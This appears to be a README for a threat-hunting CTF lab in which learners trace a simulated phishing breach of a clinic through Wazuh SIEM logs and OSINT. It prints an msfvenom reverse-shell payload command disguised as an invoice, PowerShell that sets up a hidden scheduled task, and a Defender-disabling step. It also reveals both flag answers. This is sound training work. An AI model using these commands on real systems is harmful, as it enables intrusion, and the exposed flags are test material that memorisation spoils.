# MDClinic CTF Lab — Threat Hunting Challenge

[![License](https://img.shields.io/badge/License-Educational-blue)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate%2FAdvanced-red)]()
[![Flags](https://img.shields.io/badge/Flags-2-green)]()
[![Status](https://img.shields.io/badge/Status-Active-brightgreen)]()
[![Version](https://img.shields.io/badge/Version-1.0-blue)]()

---

## 📖 Overview

**MDClinic CTF Lab** is a comprehensive hands-on cybersecurity challenge that simulates a real-world breach of a healthcare organization's infrastructure. Participants investigate authentic attack artifacts, analyze SIEM logs, and employ OSINT techniques to recover hidden flags.

**Lab Highlights:**
- 🔴 Real attack chain: Initial Access → Persistence
- 📊 Authentic Wazuh SIEM with genuine Windows event logs
- 🔍 Host-based investigation requiring log correlation and analysis
- 🕵️ OSINT component with fake news portal and employee social media
- 🏥 Healthcare industry-specific threat scenario

---

## 🎯 Scenario & Attack Overview

### MDClinic Organization Profile

**Name:** MDClinic  
**Type:** Healthcare Facility  
**Services:** General Surgery, Specialized Medical Services  
**Infrastructure:** Multiple workstations (Reception, Accounting)  
**Security Posture:** Standard healthcare security (pre-breach state)

### Attack Scenario: "The Invoice Compromise"

**Date:** August 8, 2026  
**Initial Vector:** Malicious PDF invoice attachment  
**Entry Point:** Reception workstation (user interaction)  
**Objective:** Data exfiltration and persistent access

**Invoice Details:**

Invoice Number:    INV-2026-015
Sender:           Abdullah Al-Nasser (General Surgery Department)
Organization:     MDClinic
Date:             2026-08-08
Amount:           740 SAR
File Type:        PDF (Embedded Malware)
Attack Vector:    “Open Attachment” button click


### Complete Attack Chain
```
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 1: INITIAL ACCESS                                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Email Delivery                                              │
│     └─ Malicious PDF (INV-2026-015.pdf) in inbox              │
│                                                                  │
│  2. User Interaction                                            │
│     └─ Receptionist clicks “Open Attachment”                  │
│     └─ Security alert triggered in Wazuh                      │
│     └─ Alert path: C:\ProgramData\Microsoft\Windows\Caches    │
│                                                                  │
│  3. Malware Execution                                           │
│     └─ msfvenom payload executes silently                      │
│     └─ Windows Defender disabled via Registry modification     │
│     └─ PowerShell EncodedCommand execution                     │
│     └─ Command: New-ScheduledTaskAction (persistence setup)    │
│                                                                  │
│  4. Reverse Shell Established                                  │
│     └─ Connection to Kali (192.168.56.119:4444)               │
│     └─ Attack type: windows/x64/shell/reverse_tcp             │
│     └─ Full system access gained                               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ PHASE 2: PERSISTENCE                                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Scheduled Task Creation                                     │
│     └─ Task Name: MDClinck_Maintenance                         │
│     └─ Trigger: On User Logon (SYSTEM privilege)              │
│     └─ Action: Hidden PowerShell command                       │
│     └─ Flag 2 embedded in task metadata (Base64 encoded)      │
│                                                                  │
│  2. Registry Persistence                                        │
│     └─ Registry Path: HKLM\Software\Microsoft\Windows...     │
│     └─ Defender DisableAntiSpyware value set to 1             │
│     └─ Run key modifications for auto-execution               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘

```

## 🏗️ Architecture & Infrastructure
## Lab Environment Diagram
```

                              ┌─────────────────────────────┐
                              │      WAZUH SIEM SERVER      │
                              │        Ubuntu 22.04         │
                              │       192.168.56.125        │
                              ├─────────────────────────────┤
                              │                             │
                              │  Wazuh Manager 4.14.7      │
                              │  • Event Processing         │
                              │  • Alerting & Correlation   │
                              │  • Agent Management         │
                              │  • Threat Detection         │
                              │                             │
                              │  Wazuh Dashboard            │
                              │  • Log Visualization        │
                              │  • Alert Management          │
                              │                             │
                              │  OpenSearch / Elasticsearch  │
                              │  • Log Indexing             │
                              │  • Event Storage             │
                              │                             │
                              └──────────────┬──────────────┘
                                             │
                         ┌───────────────────┴───────────────────┐
                         │                                       │
                         ▼                                       ▼
              ┌──────────────────────┐              ┌──────────────────────┐
              │     RECEPTION VM     │              │    ACCOUNTING VM     │
              │      RECEPITON-1     │              │    MDClinc-Account   │
              │    192.168.56.127    │              │    192.168.56.129    │
              ├──────────────────────┤              ├──────────────────────┤
              │ Windows 10           │              │ Windows 10           │
              │ 2 vCPU / 4 GB RAM    │              │ 2 vCPU / 4 GB RAM    │
              │                      │              │                      │
              │ Components           │              │ Components           │
              │ • Wazuh Agent        │              │ • Wazuh Agent        │
              │ • Sysmon             │              │ • Sysmon              │
              │ • Windows Logs       │              │ • Windows Logs        │
              │ • PowerShell         │              │ • Task Scheduler      │
              │ • Script Logging     │              │ • Script Logging      │
              │                      │              │                      │
              │ Event Sources        │              │ Event Sources         │
              │ • Sysmon:            │              │ • Sysmon:             │
              │   1, 3, 11, 13       │              │   1, 3, 11, 13        │
              │ • WinEvent:          │              │ • WinEvent:           │
              │   4688, 4698, 7045   │              │   4688, 4698          │
              └──────────────────────┘              └──────────────────────┘
```
## Infrastructure Overview

| System | Operating System | IP Address | Purpose |
|----------|----------|----------|----------|
| Wazuh SIEM Server | Ubuntu 22.04 | 192.168.56.125 | Monitoring, detection, alerting, and log management |
| Reception VM | Windows 10 | 192.168.56.127 | Primary endpoint and attack target |
| Accounting VM | Windows 10 | 192.168.56.129 | Secondary monitored endpoint |

## Monitoring Stack

| Component | Role |
|-----------|------|
| Wazuh Manager 4.14.7 | Event processing, rule correlation, alerting, and agent management |
| Wazuh Dashboard | Alert visualization and investigation |
| OpenSearch | Event indexing and storage |
| Wazuh Agent | Endpoint telemetry collection |
| Sysmon | Process, network, file, and registry monitoring |
| Windows Event Logs | Native Windows security and system events |
| PowerShell Logging | Command and script execution visibility |

## Event Sources

- Sysmon Events
- Windows Security Logs
- Windows System Logs
- PowerShell Operational Logs
- Registry Events
- Process Creation Events
- Network Connection Events
- File Creation and Modification Events

---

## 🔴 Attack Execution Details

### Phase 1: Initial Access

**Payload Generation:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp \
  LHOST=192.168.56.119 \
  LPORT=4444 \
  -f exe -o Invoice_INV-2026-015.exe

```
Execution Method:

	•	Filename: Invoice_INV-2026-015.exe (disguised as PDF)
	•	Delivery: Email attachment
	•	Trigger: User clicks “Open Attachment”
	•	Execution Context: User privilege level

Resulting Events in Wazuh:
Event ID 1 (Process Creation):
  Process: Invoice_INV-2026-015.exe
  Parent Process: explorer.exe
  Execution Context: User privilege level
  Status: Successful execution

Event ID 11 (File Create):
  Location: C:\ProgramData\Microsoft\Windows\Caches\Hello Im Here\
  File: flag1.txt
  Creator: System process (via malware)

Event ID 13 (Registry Modification):
  Target: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
  Action: Disable antivirus functionality
  Status: Successful

Phase 2: Persistence Mechanism 

Schedule Tasks Creation:
New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c powershell -NoProfile -EncodedCommand..."

Register-ScheduledTask -TaskName "MDClinck_Maintenance" `
  -Action $action `
  -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
  -RunLevel Highest `
  -Force

Task Details:

	•	Name: MDClinck_Maintenance
	•	Trigger: User logon (SYSTEM privilege)
	•	Hidden: Yes (no display in UI)
	•	Action: PowerShell with Base64-encoded command
	•	Payload: FLAG{MDCLINIC_HAB4TENANCE_2026} (embedded, Base64)

Corresponding Events in Wazuh:
Event ID 106 (Task Registered):
  TaskName: \MDClinck_Maintenance
  Privilege Level: SYSTEM
  Task Trigger: User Logon

Event ID 200 (Task Executed):
  TaskName: \MDClinck_Maintenance
  Execution Context: PowerShell with EncodedCommand
🚩 Flags & Investigation Guide

## FLAG 1 — Initial Access Detection

Flag Value: Flag{1IN_015_4Atttak_Initial_Access}

Location
C:\ProgramData\Microsoft\Windows\Caches\Hello Im Here\flag1.txt

Investigation Path A: Invoice Website Approach

	1.	Access the MDClinic billing website portal
	2.	Locate malicious invoice INV-2026-015
	3.	Review invoice details and metadata
	4.	Identify the malicious file reference
	5.	Follow the hunting path toward file artifacts
	6.	Locate FLAG 1 in the system path

Investigation Path B: SIEM Security Telemetry Approach

	1.	Access Wazuh Dashboard
	2.	Navigate to RECEPITON-1 agent
	3.	Review security telemetry for attacker behavior
	4.	Search for file creation events (Event ID 11)
	5.	Filter: data.win.eventdata.targetFilename: "*Caches*"
	6.	Analyze file artifacts created by malware
	7.	Locate folder “Hello Im Here” in ProgramData
	8.	Extract FLAG 1 from flag1.txt

Key Indicators:

	•	Event ID: 11 (FileCreate)
	•	Creator: SYSTEM privilege
	•	Suspicious: Hidden folder in system directory
	•	Path: C:\ProgramData (sensitive system location)

## FLAG 2 — Persistence & Lateral Movement

Flag Value: FLAG{MDCLINIC_HAB4TENANCE_2026} (Base64 encoded in scheduled task)

Investigation Path:

Step 1 — OSINT Phase:

	1.	Access internal news portal (provided environment)
	2.	Search articles mentioning MDClinic employees
	3.	Find reference to Sarah Al-Harbi 
	4.	Locate Sarah’s social media profile (Twitter-like platform)
	5.	Review her public posts and shared images
	6.	Find image with office/desk background
	7.	Extract hint: “some maintenance only happens when no one is watching”

Step 2 — Technical Investigation:

	1.	Use hint from OSINT to guide investigation
	2.	Access Wazuh Dashboard → MDClinc-Accounting agent
	3.	Search for scheduled tasks created around the incident time
	4.	Filter: data.win.eventdata.taskName: "*Maintenance*"
	5.	Locate task: “MDClinck_Maintenance”
	6.	Extract Base64-encoded payload
	7.	Decode to reveal FLAG 2

Wazuh Investigation Queries:

# Locate scheduled task creation
agent.name: "MDClinc-Accounting" AND 
data.win.eventdata.eventID: "106"

# Find specific task by name pattern
data.win.eventdata.taskName: "*Maintenance*" OR 
data.win.eventdata.taskName: "*MDClinck*"

# Correlate with execution events
data.win.eventdata.eventID: ("106" OR "200") AND
data.win.eventdata.taskName: "*"

Key Indicators:

	•	Event ID: 106 (Task Registered), 200 (Task Executed)
	•	Task Name: MDClinck_Maintenance
	•	Privilege: SYSTEM
	•	Trigger: At Logon
	•	Hidden: Yes

## 🔍 Investigation Tools & Queries

Wazuh Dashboard Navigation

Key Sections to Explore:

	•	Agents — View connected machines and status
	•	Discover — Raw event viewing and filtering
	•	Modules — Categorized views (Windows Security, File Integrity, etc.)
	•	Alerts — Generated security alerts
	•	Timeline — Temporal analysis of events

Essential Search Filters

By Machine:

agent.name: "RECEPITON-1"
agent.name: "MDClinc-Accounting"
By Event Type:
data.win.eventdata.eventID: "1"
data.win.eventdata.eventID: "3"
data.win.eventdata.eventID: "11"
data.win.eventdata.eventID: "13"
data.win.eventdata.eventID: "106"
By Content:
data.win.eventdata.commandLine: "*powershell*"
data.win.eventdata.targetFilename: "*Defender*"
analysis Workflow:
1. Timeline Review
   └─ Identify suspicious activity patterns
   └─ Note unusual spikes in activity

2. Process Analysis
   └─ Track parent-child relationships
   └─ Identify suspicious execution chains
   └─ Look for script block execution

3. File System Analysis
   └─ Monitor C:\ProgramData and C:\Windows\Temp
   └─ Check for new file creation
   └─ Review file modifications

4. Task/Persistence Analysis
   └─ Review scheduled task events
   └─ Check registry modifications
   └─ Identify persistence mechanisms

## 📚 Event Reference

Sysmon Events in This Lab

Event ID	Purpose	Key Fields
1	Process Creation	ParentImage, CommandLine, User
3	Network Connection	SourceIp, DestinationPort, Protocol
11	FileCreate	TargetFilename, Creator
13	Registry Modification	TargetObject, Details
17-21	WMI Activity	EventType, Query

Windows Event Log IDs in This Lab

Event ID	Source	Purpose
4688	Security	Process Execution
4698	Security	Scheduled Task Created
4699	Security	Scheduled Task Deleted
4700	Security	Scheduled Task Disabled
7045	System	Service Installed

## 📊 Expected Findings Summary

Key Artifacts to Discover:

	•	✅ Initial payload execution (Process Creation Events)
	•	✅ Registry modification (System Configuration Changes)
	•	✅ Scheduled task creation (Persistence Mechanism)
	•	✅ File creation in suspicious paths (FLAG locations)
	•	✅ System behavior anomalies in SIEM logs

## 👤 Project Author

Ahad Alotaibi

Developed for Tuwaiq Academy Cyber Threat Hunting Training
